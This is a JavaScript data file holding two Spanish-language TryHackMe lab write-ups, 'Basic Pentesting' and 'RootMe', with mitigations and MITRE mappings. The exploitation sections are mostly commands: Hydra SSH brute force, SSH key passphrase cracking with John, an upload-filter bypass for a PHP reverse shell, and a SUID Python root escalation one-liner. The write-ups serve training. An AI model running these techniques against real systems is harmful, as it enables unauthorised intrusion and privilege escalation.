export const tryhackmeMachines = [
  {
    name: "Basic Pentesting",
    slug: "basicpentesting",
    difficulty: "Easy",
    os: "Linux",
    image: "/machines/thm-basicpentesting.png",
    tags: ["Enumeration", "Hydra", "SSH", "LinPEAS", "JohnTheRipper", "PrivEsc"],
    writeup: {
      title: "Basic Pentesting",
      platform: "TryHackMe",
      author: "Kollin23",
      authorUrl: "https://github.com/Kollin23",
      summary:
        "Máquina de nivel básico centrada en enumeración de servicios, fuerza bruta SSH con Hydra, escalada de privilegios usando LinPEAS y crackeo de clave privada SSH con JohnTheRipper para pivotar al usuario kay y obtener la contraseña final.",
      objectives: [
        "Enumerar puertos y servicios con Nmap y exportar resultados a HTML",
        "Descubrir directorios ocultos con Gobuster y usuarios con Enum4linux",
        "Aplicar fuerza bruta SSH con Hydra al usuario jan",
        "Escalar privilegios usando LinPEAS para identificar la clave privada de kay",
        "Crackear la passphrase de la clave SSH con JohnTheRipper",
      ],
      environment: {
        vms: ["Parrot Security (atacante)", "TryHackMe VPN — 10.10.11.52 (objetivo)"],
        topology: "Túnel OpenVPN a la red de TryHackMe",
        prerequisites: ["Nmap", "Gobuster", "Enum4linux", "Hydra", "LinPEAS", "John the Ripper", "SSH"],
      },
      scope:
        "Entorno controlado alojado en TryHackMe. Sin sistemas reales involucrados. Todas las acciones dentro del scope de la room.",
      enumeration: {
        network: [
          {
            command: "ping 10.10.11.52",
            result: "PING 10.10.11.52 — TTL=63, conexión confirmada con la máquina objetivo.",
          },
          {
            command: "nmap -sC -sV -oX ports.xml 10.10.11.52",
            result:
              "22/tcp  open  ssh      OpenSSH 7.2p2\n80/tcp  open  http     Apache httpd 2.4.18\n139/tcp open  netbios  Samba 4.3.11\n445/tcp open  smb      Samba 4.3.11",
          },
          {
            command: "xsltproc ports.xml -o ports.html",
            result: "Conversión del .xml a .html para visualizar el reporte de Nmap en el navegador.",
          },
        ],
        services: [
          "SSH 22 — OpenSSH 7.2p2",
          "HTTP 80 — Apache 2.4.18 con referencias al usuario 'J' (jan)",
          "Samba 139/445 — versión 4.3.11, comparticiones accesibles sin autenticación",
        ],
        additional: [
          {
            command: "gobuster dir -u http://10.10.11.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            result: "/development  [Status: 301]\n/secret       [Status: 301]",
          },
          {
            command: "enum4linux -a 10.10.11.52 | tee enum4linux.log",
            result:
              "Local Users encontrados:\n  - User\\kay\n  - User\\jan\n  - User\\ubuntu\n\nLa web menciona 'J (For J)' → usuario: jan",
          },
        ],
      },
      exploitation: {
        steps: [
          {
            title: "Fuerza bruta SSH con Hydra sobre el usuario jan",
            description:
              "La web hace referencia a 'J (For J)', lo que apunta al usuario jan descubierto con enum4linux. Lanzamos Hydra contra SSH.",
            code: "hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.52",
          },
          {
            title: "Acceso SSH como jan",
            description: "Hydra encuentra la contraseña. Entramos a la máquina con jan.",
            code: "ssh jan@10.10.11.52\n# Password: armando",
          },
          {
            title: "Descarga y transferencia de LinPEAS",
            description:
              "Descargamos LinPEAS en la máquina atacante y lo transferimos a /dev/shm en el objetivo.",
            code: `wget https://github.com/peass-ng/PEASS-ng/releases/download/20251115-0322d43c/linpeas.sh

scp linpeas.sh jan@10.10.11.52:/dev/shm`,
          },
          {
            title: "Ejecución de LinPEAS",
            description: "Damos permisos de ejecución y lanzamos LinPEAS para identificar vectores de escalada.",
            code: "chmod +x linpeas.sh\n./linpeas.sh",
          },
        ],
      },
      postExploitation: {
        collection: [
          "LinPEAS identifica el directorio /home/kay/.ssh con un fichero id_rsa legible",
          "Copiamos el contenido del id_rsa de kay a nuestra máquina atacante",
        ],
        privesc: [
          {
            title: "Crackeo de clave SSH privada de kay con John the Ripper",
            description:
              "La clave privada de kay requiere passphrase. Convertimos el id_rsa al formato de John y lo crackeamos con rockyou.txt.",
            code: `# En máquina atacante: guardar id_rsa y restringir permisos
nano kay_id_rsa
chmod 600 kay_id_rsa

# Preparar para John
ssh2john kay_id_rsa > forjohn.txt

# Crackear
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Resultado: beeswax`,
          },
          {
            title: "SSH como kay con la passphrase crackeada",
            description:
              "Accedemos como kay usando la clave privada y la passphrase descubierta. Obtenemos la contraseña final en pass.bak.",
            code: `ssh -i kay_id_rsa kay@10.10.11.52
# Passphrase: beeswax

ls -la
cat pass.bak   # → contraseña final`,
          },
        ],
        lateral: [
          "Pivote de jan → kay mediante clave SSH crackeada con JohnTheRipper",
        ],
      },
      persistence: {
        methods: ["N/A — entorno CTF de TryHackMe"],
        techniques: [],
      },
      exfiltration: null,
      mitre: [
        {
          id: "T1046",
          name: "Network Service Discovery",
          description: "Nmap con -sC -sV para enumerar puertos y versiones de servicios",
        },
        {
          id: "T1083",
          name: "File and Directory Discovery",
          description: "Gobuster para descubrir directorios ocultos en el servidor web",
        },
        {
          id: "T1087.001",
          name: "Account Discovery: Local Account",
          description: "Enum4linux extrae usuarios locales del servicio Samba",
        },
        {
          id: "T1110.001",
          name: "Brute Force: Password Guessing",
          description: "Hydra con rockyou.txt para fuerza bruta SSH sobre el usuario jan",
        },
        {
          id: "T1021.004",
          name: "Remote Services: SSH",
          description: "SSH usado para acceso inicial (jan) y movimiento lateral (kay)",
        },
        {
          id: "T1552.004",
          name: "Unsecured Credentials: Private Keys",
          description: "Clave privada SSH de kay legible por el usuario jan",
        },
        {
          id: "T1110.002",
          name: "Brute Force: Password Cracking",
          description: "JohnTheRipper crackeó la passphrase del id_rsa de kay",
        },
      ],
      mitigations: [
        {
          title: "Permisos estrictos en directorios /home",
          description: "El directorio /home/kay/.ssh no debería ser legible por otros usuarios. Usar chmod 700.",
          priority: "Critical",
        },
        {
          title: "Deshabilitar autenticación SSH por contraseña",
          description: "Forzar autenticación por clave pública y desactivar PasswordAuthentication en sshd_config.",
          priority: "Critical",
        },
        {
          title: "Eliminar acceso anónimo a SMB",
          description: "Configurar Samba para rechazar sesiones no autenticadas y no exponer usuarios del sistema.",
          priority: "High",
        },
        {
          title: "Contraseñas fuertes",
          description: "La contraseña 'armando' está en rockyou.txt. Usar contraseñas de al menos 16 caracteres con entropía alta.",
          priority: "High",
        },
      ],
      lessons: {
        worked: [
          "La referencia 'J (For J)' en la web aceleró la identificación del usuario objetivo",
          "Enum4linux enumeró los usuarios locales rápidamente sin autenticación",
          "LinPEAS identificó de forma inmediata la clave privada mal protegida",
        ],
        improve: [
          "Automatizar la conversión nmap XML → HTML en el workflow inicial",
          "Probar gobuster con extensiones (-x php,txt,bak) para descubrir más recursos",
          "Añadir CrackMapExec como alternativa a enum4linux para enumeración SMB",
        ],
      },
      screenshots: [],
    },
  },
  {
    name: "RootMe",
    slug: "rootme",
    difficulty: "Easy",
    os: "Linux",
    image: "/machines/thm-rootme.png",
    tags: ["File Upload Bypass", "Reverse Shell", "SUID", "Python", "GTFOBins"],
    writeup: {
      title: "RootMe",
      platform: "TryHackMe",
      author: "Kollin23",
      authorUrl: "https://github.com/Kollin23",
      summary:
        "Máquina de nivel básico con un panel de subida de ficheros que aplica un filtro sobre extensiones .php. Se bypasea renombrando la reverse shell a .php5. Escalada de privilegios explotando el binario Python con SUID mediante GTFOBins.",
      objectives: [
        "Enumerar puertos y el servidor web con Nmap y Gobuster",
        "Descubrir el panel de subida de ficheros en /panel",
        "Bypassear el filtro de extensión PHP usando .php5",
        "Obtener una reverse shell y capturar la flag de usuario",
        "Explotar el binario Python SUID para escalar a root",
      ],
      environment: {
        vms: ["Parrot Security (atacante)", "TryHackMe VPN — 10.80.183.44 (objetivo)"],
        topology: "Túnel OpenVPN a la red de TryHackMe",
        prerequisites: ["Nmap", "Gobuster", "Netcat", "Reverse shell PHP", "GTFOBins"],
      },
      scope:
        "Entorno controlado alojado en TryHackMe. Sin sistemas reales involucrados. Todas las acciones dentro del scope de la room.",
      enumeration: {
        network: [
          {
            command: "nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.80.183.44",
            result: "22/tcp open  ssh\n80/tcp open  http",
          },
          {
            command: "nmap -sC -sV -vvv -oX ports.xml 10.80.183.44",
            result:
              "22/tcp open  ssh   OpenSSH 7.2p2\n80/tcp open  http  Apache httpd 2.4.29",
          },
        ],
        services: [
          "SSH 22 — OpenSSH 7.2p2",
          "HTTP 80 — Apache 2.4.29 con aplicación web custom",
        ],
        additional: [
          {
            command: "gobuster dir -u http://10.80.183.44/ -w /usr/share/wordlists/dirb/common.txt",
            result:
              "/panel   [Status: 200]  ← panel de subida de ficheros\n/uploads [Status: 200]  ← directorio donde se almacenan los uploads",
          },
        ],
      },
      exploitation: {
        steps: [
          {
            title: "Identificar el panel de subida",
            description:
              "Gobuster descubre /panel. Al acceder vemos un formulario de subida de ficheros al servidor.",
            code: "# Navegar a: http://10.80.183.44/panel",
          },
          {
            title: "Preparar la reverse shell PHP y bypassear el filtro",
            description:
              "El panel bloquea ficheros .php. Generamos una reverse shell desde revshells.com y la renombramos a .php5 para evadir el filtro.",
            code: `# Reverse shell PHP (desde revshells.com o pentestmonkey)
# Configurar: LHOST=<TU_IP>, LPORT=4444

# Renombrar el fichero:
mv shell.php shell.php5

# Subir shell.php5 desde /panel`,
          },
          {
            title: "Ponerse en escucha y activar la reverse shell",
            description:
              "Abrimos un listener con Netcat y navegamos al fichero subido en /uploads para ejecutar la shell.",
            code: `# En máquina atacante:
nc -lvnp 4444

# En el navegador:
# http://10.80.183.44/uploads/shell.php5`,
          },
          {
            title: "Capturar flag de usuario",
            description: "Con la shell activa, localizamos y leemos la flag de usuario.",
            code: `find / -type f -name user.txt 2>/dev/null
# Resultado: /var/www/user.txt

cat /var/www/user.txt`,
          },
        ],
      },
      postExploitation: {
        collection: [
          "Flag de usuario obtenida en /var/www/user.txt",
          "Búsqueda de binarios con SUID para escalada de privilegios",
        ],
        privesc: [
          {
            title: "Python SUID — GTFOBins",
            description:
              "find detecta el binario de Python con el bit SUID activado. Consultamos GTFOBins para obtener el payload de escalada a root.",
            code: `# Buscar binarios SUID
find / -perm -4000 2>/dev/null
# → /usr/bin/python

# Técnica GTFOBins — SUID Python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami
# root

cat /root/root.txt`,
          },
        ],
        lateral: [],
      },
      persistence: {
        methods: ["N/A — entorno CTF de TryHackMe"],
        techniques: [],
      },
      exfiltration: null,
      mitre: [
        {
          id: "T1046",
          name: "Network Service Discovery",
          description: "Nmap con múltiples modos para enumerar puertos y servicios",
        },
        {
          id: "T1083",
          name: "File and Directory Discovery",
          description: "Gobuster descubrió /panel y /uploads",
        },
        {
          id: "T1190",
          name: "Exploit Public-Facing Application",
          description: "Panel de subida vulnerable con filtro bypasseable mediante extensión .php5",
        },
        {
          id: "T1059.004",
          name: "Command and Scripting Interpreter: Unix Shell",
          description: "Reverse shell PHP ejecutada en el servidor vía fichero subido",
        },
        {
          id: "T1548.001",
          name: "Abuse Elevation Control Mechanism: Setuid and Setgid",
          description: "Binario Python con SUID explotado vía GTFOBins para obtener root",
        },
      ],
      mitigations: [
        {
          title: "Validación de tipo MIME en el servidor",
          description:
            "No confiar en la extensión del fichero. Validar el Content-Type y la firma del fichero (magic bytes) en el backend.",
          priority: "Critical",
        },
        {
          title: "Almacenar uploads fuera del webroot",
          description:
            "Los ficheros subidos no deben ser accesibles directamente por HTTP. Gestionar la entrega desde el backend.",
          priority: "Critical",
        },
        {
          title: "Eliminar SUID de binarios no esenciales",
          description:
            "Auditar regularmente binarios SUID con `find / -perm /4000`. Python no debe tener SUID en un servidor web.",
          priority: "High",
        },
        {
          title: "Principio de mínimo privilegio para el proceso web",
          description:
            "Apache/Nginx deben ejecutarse con un usuario sin privilegios y sin acceso de escritura al sistema de ficheros del OS.",
          priority: "High",
        },
      ],
      lessons: {
        worked: [
          "El bypass .php5 es una técnica clásica que sigue funcionando en filtros simples por extensión",
          "GTFOBins proporcionó el payload exacto para el SUID de Python de forma inmediata",
          "Gobuster con common.txt fue suficiente para descubrir los directorios clave",
        ],
        improve: [
          "Probar también extensiones .php3, .php4, .phtml como alternativas si .php5 falla",
          "Usar una wordlist más amplia (directory-list-2.3-medium.txt) en entornos más complejos",
          "Ejecutar LinPEAS después de obtener la shell para un análisis de escalada más completo",
        ],
      },
      screenshots: [],
    },
  },
];
